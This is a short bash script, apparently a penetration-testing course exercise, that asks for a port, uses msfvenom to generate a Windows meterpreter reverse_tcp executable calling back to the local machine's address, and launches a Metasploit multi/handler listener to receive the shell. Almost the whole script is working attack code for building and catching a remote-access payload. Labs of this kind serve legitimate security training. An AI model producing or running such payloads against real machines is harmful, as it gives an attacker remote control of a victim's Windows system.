#!/bin/bash

#Ex: Create a script that would ask the user for 
#1.	IP
#echo "Please enter an IP:"
#read IP ----> also:
#read -p "Please enter an IP:" IP
##### We will use $(hostname -I)

#2.	Port
read -p "Please enter Port:" PORT

#3.	Filename
#read -p "Please enter Filename:" FILE
#And create the payload (windows/meterpreter/reverse_tcp).

msfvenom -p windows/meterpreter/reverse_tcp lhost=$(hostname -I) lport=$PORT -f exe -o rev$PORT.exe

msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost $(hostname -I);set lport $PORT;run"
